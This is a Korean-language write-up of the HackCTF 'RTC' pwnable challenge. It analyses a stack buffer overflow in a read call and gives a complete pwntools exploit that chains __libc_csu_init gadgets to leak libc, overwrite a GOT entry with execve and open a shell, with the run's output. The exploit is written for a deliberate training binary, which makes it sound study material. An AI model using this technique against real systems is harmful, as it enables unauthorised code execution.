---
title: HackCTF RTC write-up
tags: [pwnable, HackCTF, RTC]
style: 
color: 
description: Let's look at vulnerabilities that occur in the stack area
---

## Code Analysis
---
``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    char buf; // [rsp+0h] [rbp-40h]

    setvbuf(stdin, 0, 2, 0)
    write(1, "Hey, ROP! What's Up?\n", 0x15)
    return read(0, &buf, 0x200)
}
```

## Vulnerability Analysis
---

아이다로 보면 별 거 없다. 출력과 입력 후 프로그램을 종료한다. <br>
read 함수에서 버퍼오버플로우가 터진다.<br><br>

먼저 보호기법을 살펴보자.
``` bash
pwndbg> checksec
[*] '/home/lourcode/ShareFolder/problems/rtc/rtc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
<br>

gdb로 __libc_csu_init 함수를 열어보자.
```
pwndbg> disass __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400660 <+0>:	push   r15
   0x0000000000400662 <+2>:	push   r14
   0x0000000000400664 <+4>:	mov    r15d,edi
   0x0000000000400667 <+7>:	push   r13
   0x0000000000400669 <+9>:	push   r12
   0x000000000040066b <+11>:	lea    r12,[rip+0x20079e]        # 0x600e10
   0x0000000000400672 <+18>:	push   rbp
   0x0000000000400673 <+19>:	lea    rbp,[rip+0x20079e]        # 0x600e18
   0x000000000040067a <+26>:	push   rbx
   0x000000000040067b <+27>:	mov    r14,rsi
   0x000000000040067e <+30>:	mov    r13,rdx
   0x0000000000400681 <+33>:	sub    rbp,r12
   0x0000000000400684 <+36>:	sub    rsp,0x8
   0x0000000000400688 <+40>:	sar    rbp,0x3
   0x000000000040068c <+44>:	call   0x400478 <_init>
   0x0000000000400691 <+49>:	test   rbp,rbp
   0x0000000000400694 <+52>:	je     0x4006b6 <__libc_csu_init+86>
   0x0000000000400696 <+54>:	xor    ebx,ebx
   0x0000000000400698 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x00000000004006a0 <+64>:	mov    rdx,r13
   0x00000000004006a3 <+67>:	mov    rsi,r14
   0x00000000004006a6 <+70>:	mov    edi,r15d
   0x00000000004006a9 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x00000000004006ad <+77>:	add    rbx,0x1
   0x00000000004006b1 <+81>:	cmp    rbx,rbp
   0x00000000004006b4 <+84>:	jne    0x4006a0 <__libc_csu_init+64>
   0x00000000004006b6 <+86>:	add    rsp,0x8
   0x00000000004006ba <+90>:	pop    rbx
   0x00000000004006bb <+91>:	pop    rbp
   0x00000000004006bc <+92>:	pop    r12
   0x00000000004006be <+94>:	pop    r13
   0x00000000004006c0 <+96>:	pop    r14
   0x00000000004006c2 <+98>:	pop    r15
   0x00000000004006c4 <+100>:	ret
End of assembler dump.
```
<br>
우리가 봐야 할 부분은 __libc_csu_init+64 부분부터이다.<br>
64bit 바이너리에서는 인자를 전달할 때 rdi rsi rdx 순으로 레지스터에 값을 전달한 후 함수를 호출한다.<br>

```
0x00000000004006a0 <+64>:	mov    rdx,r13
0x00000000004006a3 <+67>:	mov    rsi,r14
0x00000000004006a6 <+70>:	mov    edi,r15d
0x00000000004006a9 <+73>:	call   QWORD PTR [r12+rbx*8]
0x00000000004006ad <+77>:	add    rbx,0x1
0x00000000004006b1 <+81>:	cmp    rbx,rbp
0x00000000004006b4 <+84>:	jne    0x4006a0 <__libc_csu_init+64>
0x00000000004006b6 <+86>:	add    rsp,0x8
0x00000000004006ba <+90>:	pop    rbx
0x00000000004006bb <+91>:	pop    rbp
0x00000000004006bc <+92>:	pop    r12
0x00000000004006be <+94>:	pop    r13
0x00000000004006c0 <+96>:	pop    r14
0x00000000004006c2 <+98>:	pop    r15
0x00000000004006c4 <+100>:	ret
```
r13 r14 r15에 인자를 전달하고 r12에 함수 주소를 전달하여 call한다.<br><br>

이 바이너리에서는 read 함수와 write 함수를 사용하기 때문에 RTC 기법으로 leak을 진행할 수 있다. <br>

## Exploit
---
``` python
from pwn import *

p = process('./rtc')
e = ELF('./rtc')
libc = e.libc

bss = p64(e.bss())

write_plt = p64(0x00000000004004b0)
write_got = p64(0x601018)

read_plt = p64(0x00000000004004c0)
read_got = p64(0x601020)

init = p64(0x00000000004006ba)
set_reg = p64(0x00000000004006a0)

payload = 'A' * 72
payload += init
payload += p64(0)
payload += p64(1)
payload += write_got
payload += p64(8)
payload += read_got
payload += p64(1) 
payload += set_reg

payload += 'A' * 8
payload += p64(0)
payload += p64(1)
payload += read_got
payload += p64(8)
payload += bss
payload += p64(0)
payload += set_reg

payload += 'A' * 8
payload += p64(0)
payload += p64(1)
payload += read_got
payload += p64(8)
payload += write_got
payload += p64(0)
payload += set_reg

payload += 'A' * 8
payload += p64(0)
payload += p64(1)
payload += write_got
payload += p64(0)
payload += p64(0)
payload += bss
payload += set_reg

p.sendlineafter('Hey, ROP! What\'s Up?', payload)
# pause()

read_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.info('read_addr = ' + str(hex(read_addr)))
libc_base = read_addr - libc.sym['read']
log.info('libc_base = ' + str(hex(libc_base)))
execve_addr = libc_base + libc.sym['execve']
log.info('execve_addr = ' + str(hex(execve_addr)))

p.send('/bin/sh\x00')
p.sendline(p64(execve_addr))

p.interactive()
```

<br>

``` bash
lourcode@lourcode-ubuntu:~/ShareFolder/problems/rtc$ python rtc.py
[+] Starting local process './rtc': pid 15247
[*] '/home/lourcode/ShareFolder/problems/rtc/rtc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] u'/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] read_addr = 0x7fdeb0aa9140
[*] libc_base = 0x7fdeb0999000
[*] execve_addr = 0x7fdeb0a7dc00
[*] Switching to interactive mode
\x00$ whoami
lourcode
```

쉘을 획득했다. <br><br>

### Good Game!
EZ

